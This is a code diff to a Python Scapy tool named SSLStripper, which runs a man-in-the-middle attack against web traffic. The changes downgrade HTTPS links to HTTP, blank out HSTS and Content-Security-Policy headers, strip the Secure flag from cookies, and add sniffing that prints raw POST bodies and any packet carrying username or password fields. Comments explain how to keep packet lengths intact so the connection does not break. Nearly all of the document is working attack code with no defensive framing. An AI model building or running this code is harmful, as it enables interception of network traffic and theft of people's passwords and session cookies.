@@ -40,7 +40,8 @@ class SSLStripper:
         # Common headers to strip
         self.strip_headers = [
             b'Strict-Transport-Security',
-            b'upgrade-insecure-requests'
+            b'upgrade-insecure-requests',
+            b'Content-Security-Policy'
         ]
         
         logger.info("SSL Stripper initialized")
@@ -62,6 +63,8 @@ class SSLStripper:
                     modified = self.strip_https_links(scapy_packet)
                     if modified:
                         packet.set_payload(bytes(modified))
+                    
+                    self.analyze_http_data(scapy_packet)
             
             packet.accept()
             
@@ -85,41 +88,41 @@ class SSLStripper:
         try:
             load = packet[Raw].load
             modified = False
+
+            def replace_with_spaces(match):
+                return b' ' * len(match.group(0))
             
-            # Replace HTTPS with HTTP
+            # 1. Replace 'https://' with 'http:// ' (Notice the extra space!)
+            # We replace 8 chars (https://) with 8 chars (http:// ) to keep length same
             if self.https_pattern.search(load):
-                logger.info(f"Found HTTPS link, stripping...")
-                new_load = self.https_pattern.sub(b'http://', load)
+                logger.info(f"Found HTTPS link, downgrading...")
+                load = self.https_pattern.sub(b'http:// ', load)
                 modified = True
-            else:
-                new_load = load
-            
-            # Strip Secure flag from cookies
-            if b'Set-Cookie:' in new_load and self.secure_pattern.search(new_load):
-                logger.info("Stripping Secure flag from cookies")
-                new_load = self.secure_pattern.sub(b'', new_load)
-                modified = True
-            
-            # Remove HSTS headers
+
+            # 2. Kill the Security Headers (By overwriting with spaces)
+            # Do NOT delete them, or TCP breaks. Just blank them out.
             for header in self.strip_headers:
-                if header in new_load:
-                    logger.info(f"Removing security header: {header.decode()}")
-                    # Remove the entire header line
+                if header in load:
+                    logger.info(f"Nuking security header: {header.decode()}")
+                    # Regex to find the whole line
                     pattern = header + rb':[^\r\n]*\r\n'
-                    new_load = re.sub(pattern, b'', new_load, flags=re.IGNORECASE)
+                    # Replace the entire match with spaces
+                    load = re.sub(pattern, replace_with_spaces, load, flags=re.IGNORECASE)
                     modified = True
             
+            # 3. Strip Secure Cookies (Overwrite 'Secure' with '      ')
+            if b'Set-Cookie:' in load and self.secure_pattern.search(load):
+                load = self.secure_pattern.sub(replace_with_spaces, load)
+                modified = True
+
             if modified:
-                # Update packet
-                packet[Raw].load = new_load
-                
-                # Delete checksums and lengths so they are recalculated
+                packet[Raw].load = load
+                # Delete checksums so Scapy recalculates them
                 del packet[IP].len
                 del packet[IP].chksum
                 del packet[TCP].chksum
-                
                 return packet
-            
+
         except Exception as e:
             logger.error(f"Error in strip_https_links: {e}")
         
@@ -155,19 +158,20 @@ class SSLStripper:
         try:
             load = packet[Raw].load.decode('utf-8', errors='ignore')
             
-            # Check for POST requests (often contain credentials)
-            if load.startswith('POST'):
-                logger.warning(f"Captured POST request")
+            # 1. Catch POST Requests (Login submissions)
+            if 'POST' in load and 'HTTP/1.' in load:
+                logger.warning(f"Captured POST Data:")
+                # Log the whole load so you see the body (username/password)
+                print(f"\n[+] RAW POST BODY:\n{load}\n")
                 self.log_data("POST Request", load)
-                
-                # Look for common credential fields
-                if any(field in load.lower() for field in ['password', 'passwd', 'pwd', 'pass']):
-                    logger.warning("*** Potential password captured! ***")
-            
-            # Check for authentication headers
-            if 'Authorization:' in load or 'Cookie:' in load:
-                logger.warning("Captured authentication data")
-                self.log_data("Authentication", load)
+
+            # 2. Catch Specific Credential Keywords anywhere in the packet
+            # (Sometimes the POST header is in packet A, and the password is in packet B)
+            keywords = ['username=', 'user=', 'uname=', 'password=', 'pass=', 'passwd=', 'pwd=']
+            if any(key in load.lower() for key in keywords):
+                logger.warning("*** CREDENTIALS FOUND ***")
+                print(f"\n[+] SUSPICIOUS DATA SNIFFED:\n{load}\n")
+                self.log_data("Credentials", load)
         
         except Exception as e:
             logger.error(f"Error analyzing HTTP data: {e}")
